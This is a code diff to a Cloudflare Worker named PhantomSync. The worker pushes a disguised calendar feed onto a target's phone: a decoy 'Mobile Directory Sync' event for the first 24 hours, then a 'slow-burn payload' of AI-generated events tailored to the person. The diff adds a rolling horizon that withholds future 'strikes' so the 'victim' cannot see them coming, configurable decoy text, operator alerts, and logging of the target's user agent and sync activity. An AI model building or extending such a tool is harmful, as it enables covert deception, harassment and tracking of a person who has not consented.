@@ -1,7 +1,7 @@
 /**
  * PhantomSync Cloudflare Worker API
  * 
- * Version 4.2.0 - Stable RFC-5545 Feeds + Immediate Day 1 Proof + Trojan Shield
+ * Version 4.3.0 - Rolling Drip Horizon + High-Converting Decoys + Stealth Drip Engine
  * 
  * Combines 25 live Gemini AI events tailored to the target's exact lore
  * with a massive 1,000+ procedural & curated incident backlog to build
@@ -32,7 +32,7 @@ export default {
         JSON.stringify({
           status: "online",
           service: "PhantomSync AI Backend",
-          version: "4.2.0 (Stable RFC-5545 Feeds + Immediate Day 1 Proof + Trojan Shield)",
+          version: "4.3.0 (Rolling Drip Horizon + High-Converting Decoys + Stealth Drip Engine)",
           has_gemini_key: Boolean(env.GEMINI_API_KEY),
           has_stripe_key: Boolean(env.STRIPE_SECRET_KEY),
           has_kv_storage: Boolean(env.PHANTOM_KV),
@@ -134,6 +134,7 @@ export default {
         decoyMemo = "Mobile device registered to secure directory synchronization. Routine periodic sync active.",
         decoyDate = null,
         decoyLocation = "",
+        dripDays = 14,
       } = body;
 
       if (!events || !events.length) {
@@ -154,11 +155,13 @@ export default {
         decoyMemo,
         decoyDate,
         decoyLocation,
+        dripDays: Number(dripDays !== undefined ? dripDays : 14),
         createdAt: Date.now(),
         syncCount: 0,
         lastSyncAt: null,
         lastUserAgent: null,
         killSwitch: false,
+        forceLive: false,
       };
 
       await saveCampaign(env, campaign);
@@ -215,10 +218,21 @@ export default {
 
       // Trojan Horse check:
       // If within 24 hours of creation, serve the DECOY (1 harmless corporate check event)
-      // After 24 hours (or if ?force_live=1 or campaign.forceLive is true), serve the full 100-event payload!
+      // After 24 hours (or if ?force_live=1 or campaign.forceLive is true), serve slow-burn payload!
       const forceLive = url.searchParams.get("force_live") === "1" || Boolean(campaign.forceLive);
       const hoursElapsed = (Date.now() - (campaign.createdAt || Date.now())) / (1000 * 60 * 60);
       const isDecoy = !forceLive && (hoursElapsed < 24);
+
+      // Rolling Drip Horizon:
+      // Can be overridden with ?drip=0 or ?all=1 for pranker previewing
+      const paramDrip = url.searchParams.get("drip");
+      const hasAll = url.searchParams.get("all") === "1";
+      let effectiveDripDays = campaign.dripDays !== undefined ? Number(campaign.dripDays) : 14;
+      if (hasAll || paramDrip === "0" || paramDrip === "false") {
+        effectiveDripDays = 0;
+      } else if (paramDrip !== null && !isNaN(Number(paramDrip))) {
+        effectiveDripDays = Number(paramDrip);
+      }
 
       // Record subscriber telemetry
       campaign.syncCount = (campaign.syncCount || 0) + 1;
@@ -236,6 +250,7 @@ export default {
         decoyMemo: campaign.decoyMemo,
         decoyDate: campaign.decoyDate,
         decoyLocation: campaign.decoyLocation,
+        dripDays: effectiveDripDays,
       });
 
       return new Response(icsOutput, {
@@ -260,6 +275,22 @@ export default {
       const forceLive = Boolean(campaign.forceLive);
       const hoursElapsed = (Date.now() - (campaign.createdAt || Date.now())) / (1000 * 60 * 60);
       const isDecoy = !forceLive && (hoursElapsed < 24);
+
+      const dripDays = campaign.dripDays !== undefined ? Number(campaign.dripDays) : 14;
+      const now = Date.now();
+      const maxFutureTime = dripDays > 0 ? now + (dripDays * 86400 * 1000) : Infinity;
+
+      let eventsRevealed = 0;
+      let eventsQueued = 0;
+      (campaign.events || []).forEach(ev => {
+        const dt = new Date(ev.dateObj || Date.now()).getTime();
+        if (dripDays > 0 && dt > maxFutureTime) {
+          eventsQueued++;
+        } else {
+          eventsRevealed++;
+        }
+      });
+
       return new Response(
         JSON.stringify({
           success: true,
@@ -267,13 +298,44 @@ export default {
           name: campaign.name,
           createdAt: campaign.createdAt,
           hoursElapsed: Math.round(hoursElapsed * 10) / 10,
-          trojanPhase: isDecoy ? "Phase 1: Decoy Active (1 Event)" : "Phase 2: Full Payload Deployed (100 Events)",
+          trojanPhase: isDecoy ? "Phase 1: Decoy Active (1 Event)" : "Phase 2: Slow-Burn Deployed",
           isDecoy: isDecoy,
           forceLive: forceLive,
+          dripDays: dripDays,
+          eventsRevealed: isDecoy ? 1 : eventsRevealed,
+          eventsQueued: isDecoy ? (campaign.events || []).length : eventsQueued,
+          totalEvents: (campaign.events || []).length,
           syncCount: campaign.syncCount || 0,
           lastSyncAt: campaign.lastSyncAt,
           lastUserAgent: campaign.lastUserAgent,
           killSwitch: Boolean(campaign.killSwitch),
+        }),
+        { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
+      );
+    }
+
+    // Set Drip Horizon: /api/campaigns/:id/drip
+    const dripMatch = url.pathname.match(/^\/api\/campaigns\/([a-zA-Z0-9_-]+)\/drip$/);
+    if (dripMatch && request.method === "POST") {
+      const campaignId = dripMatch[1];
+      const campaign = await getCampaign(env, campaignId);
+      if (!campaign) {
+        return new Response(JSON.stringify({ error: "Not found" }), { status: 404, headers: CORS_HEADERS });
+      }
+
+      const body = await request.json().catch(() => ({}));
+      const newDrip = Number(body.dripDays !== undefined ? body.dripDays : 14);
+      campaign.dripDays = newDrip;
+      await saveCampaign(env, campaign);
+
+      return new Response(
+        JSON.stringify({
+          success: true,
+          campaignId: campaign.id,
+          dripDays: campaign.dripDays,
+          message: newDrip > 0
+            ? `Rolling drip horizon set to ${newDrip} days. Target only sees ${Math.round(newDrip / 7)} weeks ahead at any time.`
+            : "Rolling drip disengaged. All events visible across full calendar.",
         }),
         { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
       );
@@ -294,14 +356,9 @@ export default {
       // Optional real-time notification to owner via Discord Webhook
       if (env && env.DISCORD_WEBHOOK_URL && ctx && ctx.waitUntil) {
         ctx.waitUntil(sendDiscordNotification(env.DISCORD_WEBHOOK_URL, {
-          title: `🎯 New Campaign Armed: ${name}`,
-          description: `Campaign ID: \`${campaignId}\`\nQuirks: "${(quirks || 'none').slice(0, 120)}..."`,
-          color: 0x06b6d4,
-          fields: [
-            { name: "Events", value: `${events.length}`, inline: true },
-            { name: "Delay", value: `${delayDays}d`, inline: true },
-            { name: "Feed", value: `webcal://${host}/cal/${campaignId}.ics`, inline: false }
-          ]
+          title: campaign.killSwitch ? `🚨 Kill Switch ENGAGED: ${campaign.name}` : `♻️ Feed Restored: ${campaign.name}`,
+          description: `Campaign ID: \`${campaignId}\`\nFeed wiped on target phone: ${campaign.killSwitch ? "YES" : "NO"}`,
+          color: campaign.killSwitch ? 0xef4444 : 0x10b981,
         }));
       }
 
@@ -333,14 +390,9 @@ export default {
       // Optional real-time notification to owner via Discord Webhook
       if (env && env.DISCORD_WEBHOOK_URL && ctx && ctx.waitUntil) {
         ctx.waitUntil(sendDiscordNotification(env.DISCORD_WEBHOOK_URL, {
-          title: `🎯 New Campaign Armed: ${name}`,
-          description: `Campaign ID: \`${campaignId}\`\nQuirks: "${(quirks || 'none').slice(0, 120)}..."`,
+          title: campaign.forceLive ? `⚡ Decoy Bypassed (Force Live): ${campaign.name}` : `🛡️ Decoy Restored: ${campaign.name}`,
+          description: `Campaign ID: \`${campaignId}\`\nPhase: ${campaign.forceLive ? "Live Slow-Burn" : "Trojan Decoy Active"}`,
           color: 0x06b6d4,
-          fields: [
-            { name: "Events", value: `${events.length}`, inline: true },
-            { name: "Delay", value: `${delayDays}d`, inline: true },
-            { name: "Feed", value: `webcal://${host}/cal/${campaignId}.ics`, inline: false }
-          ]
         }));
       }
 
@@ -350,7 +402,7 @@ export default {
           campaignId: campaign.id,
           forceLive: campaign.forceLive,
           message: campaign.forceLive
-            ? "Decoy bypassed on server! All 100 events will now be served to any device refreshing this feed."
+            ? "Decoy bypassed on server! Slow-burn events will now be served to any device refreshing this feed."
             : "Decoy re-enabled! Server will now serve 1 decoy event.",
         }),
         { headers: { ...CORS_HEADERS, "Content-Type": "application/json" } }
@@ -479,15 +531,16 @@ async function getCampaign(env, id) {
   return {
     id,
     name: "Target",
-    createdAt: Date.now(),
+    createdAt: Date.now() - (25 * 3600 * 1000), // Default to > 24 hours ago so edge colos never get trapped in perpetual decoy mode
     syncCount: 1,
     events: emergencySchedule,
     killSwitch: false,
+    dripDays: 14,
   };
 }
 
 /**
- * Generates an RFC-5545 compliant .ics file with Trojan Horse decoy support
+ * Generates an RFC-5545 compliant .ics file with Trojan Horse decoy & Rolling Drip support
  */
 function formatIcsCalendar({
   campaignId = "ps_live",
@@ -500,8 +553,9 @@ function formatIcsCalendar({
   decoyMemo = "Mobile device registered to secure directory synchronization. Routine periodic sync active.",
   decoyDate = null,
   decoyLocation = null,
+  dripDays = 14,
 }) {
-  const calName = isDecoy ? (decoyCalName || "Mobile Directory Sync") : "Mobile Directory Sync";
+  const calName = isDecoy ? (decoyCalName || "Mobile Directory Sync") : (decoyCalName || "Mobile Directory Sync");
   const calDesc = isWiped
     ? "Feed Terminated"
     : (isDecoy ? (decoyMemo || "Automated sync") : "Automated incident & protocol synchronization feed.");
@@ -556,14 +610,26 @@ function formatIcsCalendar({
     lines.push("DTSTAMP:20260101T000000Z");
     lines.push(`DTSTART;VALUE=DATE:${todayStr}`);
     lines.push(`DTEND;VALUE=DATE:${tomorrowStr}`);
-    lines.push("SUMMARY:📱 Mobile Directory Sync Verified");
-    lines.push("DESCRIPTION:Mobile device registered. Secure synchronization cycle verified active.");
+    lines.push(`SUMMARY:${(decoyTitle || "📱 Mobile Directory Sync Verified").replace(/[\r\n]+/g, " ")}`);
+    lines.push(`DESCRIPTION:${(decoyMemo || "Mobile device registered. Secure synchronization cycle verified active.").replace(/[\r\n]+/g, " ")}`);
     lines.push("TRANSP:TRANSPARENT");
     lines.push("END:VEVENT");
 
-    // 2. Slow-burn schedule (starting 14 days out)
+    // 2. Slow-burn schedule with Rolling Drip Horizon:
+    // If dripDays > 0, only include events up to Date.now() + (dripDays * 86400 * 1000)
+    // Past events are kept intact so the calendar builds a hilarious log without spoiling future months.
+    const now = Date.now();
+    const maxFutureTime = dripDays > 0 ? now + (dripDays * 86400 * 1000) : Infinity;
+
     events.forEach((ev, idx) => {
       const dt = new Date(ev.dateObj || Date.now());
+      const eventTime = dt.getTime();
+
+      // Withhold future strikes beyond the rolling horizon so victim cannot browse future months
+      if (dripDays > 0 && eventTime > maxFutureTime) {
+        return; // Stealth queue
+      }
+
       const dtStr = dt.toISOString().slice(0, 10).replace(/-/g, "");
       const nextDay = new Date(dt.getTime() + 86400 * 1000);
       const nextStr = nextDay.toISOString().slice(0, 10).replace(/-/g, "");
